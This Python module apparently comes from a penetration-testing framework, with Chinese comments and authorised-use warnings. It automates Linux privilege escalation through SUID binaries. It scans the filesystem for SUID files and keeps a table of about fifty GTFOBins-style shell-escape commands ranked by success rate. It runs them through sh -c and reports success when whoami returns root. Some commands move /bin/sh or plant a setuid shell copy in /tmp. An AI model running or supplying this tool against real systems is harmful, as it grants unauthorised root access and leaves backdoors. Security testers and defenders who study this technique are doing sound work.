#!/usr/bin/env python3
"""
SUID 提权模块 - SUID Exploit Module
ATT&CK Technique: T1548.001 - Setuid and Setgid

利用 SUID 二进制文件进行提权
仅用于授权渗透测试和安全研究

Warning: 仅限授权渗透测试使用！
"""

import logging
import os
import platform
import subprocess
from dataclasses import dataclass
from typing import Any, Dict, List, Optional, Tuple

from ..base import EscalationMethod, EscalationResult, PrivilegeLevel

logger = logging.getLogger(__name__)


@dataclass
class SUIDInfo:
    """SUID 二进制信息"""

    path: str
    owner: str = "root"
    group: str = "root"
    permissions: str = ""
    exploitable: bool = False
    exploit_method: str = ""

    def to_dict(self) -> Dict[str, Any]:
        return {
            "path": self.path,
            "owner": self.owner,
            "group": self.group,
            "permissions": self.permissions,
            "exploitable": self.exploitable,
            "exploit_method": self.exploit_method,
        }


class SUIDExploit:
    """
    SUID 提权模块

    扫描和利用 SUID 二进制文件进行提权

    Usage:
        exploit = SUIDExploit()
        suids = exploit.scan()
        result = exploit.exploit('/usr/bin/find')

    Warning: 仅限授权渗透测试使用！
    """

    # GTFOBins 风格的 SUID 利用方法
    EXPLOITABLE_SUID: Dict[str, Tuple[str, float]] = {
        # 格式: binary_name: (exploit_command, success_probability)
        "bash": ("bash -p", 0.95),
        "sh": ("sh -p", 0.95),
        "dash": ("dash -p", 0.95),
        "zsh": ("zsh", 0.90),
        "ksh": ("ksh -p", 0.90),
        "csh": ("csh", 0.85),
        "ash": ("ash", 0.85),
        "python": ('python -c \'import os; os.execl("/bin/sh", "sh", "-p")\'', 0.90),
        "python2": ('python2 -c \'import os; os.execl("/bin/sh", "sh", "-p")\'', 0.90),
        "python3": ('python3 -c \'import os; os.execl("/bin/sh", "sh", "-p")\'', 0.90),
        "perl": ("perl -e 'exec \"/bin/sh\";'", 0.90),
        "ruby": ("ruby -e 'exec \"/bin/sh\"'", 0.90),
        "lua": ("lua -e 'os.execute(\"/bin/sh\")'", 0.85),
        "find": ("find . -exec /bin/sh -p \\; -quit", 0.90),
        "awk": ("awk 'BEGIN {system(\"/bin/sh -p\")}'", 0.90),
        "nawk": ("nawk 'BEGIN {system(\"/bin/sh -p\")}'", 0.85),
        "gawk": ("gawk 'BEGIN {system(\"/bin/sh -p\")}'", 0.85),
        "mawk": ("mawk 'BEGIN {system(\"/bin/sh -p\")}'", 0.85),
        "vim": ("vim -c ':!/bin/sh -p'", 0.85),
        "vi": ("vi -c ':!/bin/sh -p'", 0.85),
        "nano": ("nano -s /bin/sh", 0.70),
        "ed": ("ed\n!/bin/sh -p", 0.75),
        "less": ("less /etc/passwd\n!/bin/sh -p", 0.80),
        "more": ("more /etc/passwd\n!/bin/sh -p", 0.80),
        "man": ("man man\n!/bin/sh -p", 0.75),
        "nmap": ("nmap --interactive\n!sh", 0.85),  # 老版本
        "env": ("env /bin/sh -p", 0.90),
        "time": ("time /bin/sh -p", 0.85),
        "timeout": ("timeout 10 /bin/sh -p", 0.85),
        "nice": ("nice /bin/sh -p", 0.85),
        "ionice": ("ionice /bin/sh -p", 0.85),
        "strace": ("strace -o /dev/null /bin/sh -p", 0.80),
        "ltrace": ("ltrace -o /dev/null /bin/sh -p", 0.80),
        "cp": ("cp /bin/sh /tmp/sh_suid; chmod +s /tmp/sh_suid; /tmp/sh_suid -p", 0.80),
        "mv": ("mv /bin/sh /tmp/sh_suid_bak; cp /bin/sh /tmp/sh_suid; chmod +s /tmp/sh_suid", 0.70),
        "tar": (
            "tar -cf /dev/null /etc/passwd --checkpoint=1 --checkpoint-action=exec=/bin/sh",
            0.75,
        ),
        "zip": ("TF=$(mktemp -u); zip $TF /etc/hosts -T -TT '/bin/sh -p #'", 0.70),
        "rsync": ("rsync -e 'sh -p -c \"sh -p 0<&2 1>&2\"' 127.0.0.1:/dev/null", 0.70),
        "php": ('php -r \'pcntl_exec("/bin/sh", ["-p"]);\'', 0.85),
        "node": (
            'node -e \'require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]})\'',
            0.80,
        ),
        "docker": ("docker run -v /:/mnt --rm -it alpine chroot /mnt sh", 0.90),
        "lxc": ("lxc-start", 0.85),
        "screen": ("screen", 0.70),
        "tmux": ("tmux", 0.70),
        "git": ("PAGER='sh -c \"sh -p <$(tty) >$(tty) 2>$(tty)\"' git -p help", 0.75),
        "ftp": ("ftp\n!/bin/sh -p", 0.75),
        "sftp": ("sftp -o 'ProxyCommand=sh -p'", 0.70),
        "ssh": ("ssh -o 'ProxyCommand=sh -p'", 0.70),
        "scp": ("TF=$(mktemp); echo 'sh -p 0<&2 1>&2' > $TF; scp -S $TF x y:", 0.65),
        "taskset": ("taskset 1 /bin/sh -p", 0.85),
        "setarch": ("setarch $(arch) /bin/sh -p", 0.80),
        "exim": ("exim -be '${run{/bin/sh -p}{}}'", 0.75),
        "mail": ("mail --exec='!/bin/sh -p'", 0.70),
    }

    def __init__(self):
        self.logger = logging.getLogger(f"{__name__}.SUIDExploit")
        self._suid_cache: List[SUIDInfo] = []

    def scan(self, paths: List[str] = None) -> List[SUIDInfo]:
        """
        扫描 SUID 二进制文件

        Args:
            paths: 要扫描的路径列表，默认扫描整个系统

        Returns:
            SUIDInfo 列表
        """
        # 平台检测
        if platform.system() != "Linux":
            self.logger.warning("SUID exploit is only supported on Linux")
            return []

        if paths is None:
            paths = ["/"]

        suid_files = []

        for path in paths:
            try:
                result = subprocess.run(
                    ["find", path, "-perm", "-4000", "-type", "f", "-readable"],
                    shell=False,
                    capture_output=True,
                    text=True,
                    stderr=subprocess.DEVNULL,  # 正确: 使用 DEVNULL 代替 '2>/dev/null' 参数
                    timeout=60,
                )

                for line in result.stdout.strip().split("\n"):
                    if line:
                        info = self._analyze_suid(line)
                        if info:
                            suid_files.append(info)

            except (subprocess.SubprocessError, FileNotFoundError) as e:
                self.logger.debug("Scan error for %s: %s", path, e)

        self._suid_cache = suid_files
        return suid_files

    def _analyze_suid(self, path: str) -> Optional[SUIDInfo]:
        """分析单个 SUID 文件"""
        try:
            stat_info = os.stat(path)
            binary_name = os.path.basename(path)

            info = SUIDInfo(
                path=path,
                permissions=oct(stat_info.st_mode)[-4:],
            )

            # 检查是否在已知可利用列表中
            if binary_name in self.EXPLOITABLE_SUID:
                info.exploitable = True
                info.exploit_method = self.EXPLOITABLE_SUID[binary_name][0]

            return info

        except (OSError, FileNotFoundError):
            return None

    def get_exploitable(self) -> List[SUIDInfo]:
        """获取可利用的 SUID 文件"""
        if not self._suid_cache:
            self.scan()

        return [s for s in self._suid_cache if s.exploitable]

    def exploit(self, suid_path: str) -> EscalationResult:
        """
        利用指定的 SUID 文件提权

        Args:
            suid_path: SUID 文件路径

        Returns:
            EscalationResult
        """
        # 平台检测
        if platform.system() != "Linux":
            return EscalationResult(
                success=False,
                method=EscalationMethod.SUID,
                from_level=PrivilegeLevel.LOW,
                to_level=PrivilegeLevel.LOW,
                error="SUID exploit is only supported on Linux",
            )

        binary_name = os.path.basename(suid_path)

        if binary_name not in self.EXPLOITABLE_SUID:
            return EscalationResult(
                success=False,
                method=EscalationMethod.SUID,
                from_level=PrivilegeLevel.LOW,
                to_level=PrivilegeLevel.LOW,
                error=f"Unknown SUID binary: {binary_name}",
            )

        exploit_cmd, probability = self.EXPLOITABLE_SUID[binary_name]

        # 替换命令中的二进制名为完整路径
        if exploit_cmd.startswith(binary_name):
            exploit_cmd = exploit_cmd.replace(binary_name, suid_path, 1)

        self.logger.info("Attempting SUID exploit: %s", suid_path)
        self.logger.debug("Exploit command: %s", exploit_cmd)

        try:
            # 执行利用
            # 注意：实际的 shell 获取需要交互式执行
            result = subprocess.run(
                ["sh", "-c", exploit_cmd], capture_output=True, text=True, timeout=10
            )

            # 验证是否成功
            whoami_result = subprocess.run(["whoami"], capture_output=True, text=True, timeout=5)

            if whoami_result.stdout.strip() == "root":
                return EscalationResult(
                    success=True,
                    method=EscalationMethod.SUID,
                    from_level=PrivilegeLevel.LOW,
                    to_level=PrivilegeLevel.SYSTEM,
                    output=f"Exploited {suid_path}",
                    evidence=f"whoami: root",
                )

            return EscalationResult(
                success=False,
                method=EscalationMethod.SUID,
                from_level=PrivilegeLevel.LOW,
                to_level=PrivilegeLevel.LOW,
                error=f"Exploit executed but privilege not elevated",
            )

        except subprocess.TimeoutExpired:
            # 超时可能意味着获得了交互式 shell
            return EscalationResult(
                success=True,
                method=EscalationMethod.SUID,
                from_level=PrivilegeLevel.LOW,
                to_level=PrivilegeLevel.SYSTEM,
                output=f"Exploit may have succeeded (interactive shell): {suid_path}",
                evidence=f"Command: {exploit_cmd}",
            )

        except Exception as e:
            return EscalationResult(
                success=False,
                method=EscalationMethod.SUID,
                from_level=PrivilegeLevel.LOW,
                to_level=PrivilegeLevel.LOW,
                error=str(e),
            )

    def auto_exploit(self) -> EscalationResult:
        """
        自动扫描并利用 SUID 文件

        Returns:
            EscalationResult
        """
        exploitable = self.get_exploitable()

        if not exploitable:
            return EscalationResult(
                success=False,
                method=EscalationMethod.SUID,
                from_level=PrivilegeLevel.LOW,
                to_level=PrivilegeLevel.LOW,
                error="No exploitable SUID binaries found",
            )

        # 按成功概率排序
        exploitable.sort(
            key=lambda x: self.EXPLOITABLE_SUID.get(os.path.basename(x.path), ("", 0))[1],
            reverse=True,
        )

        # 依次尝试
        for suid_info in exploitable:
            result = self.exploit(suid_info.path)
            if result.success:
                return result

        return EscalationResult(
            success=False,
            method=EscalationMethod.SUID,
            from_level=PrivilegeLevel.LOW,
            to_level=PrivilegeLevel.LOW,
            error="All SUID exploits failed",
        )


__all__ = ["SUIDExploit", "SUIDInfo"]
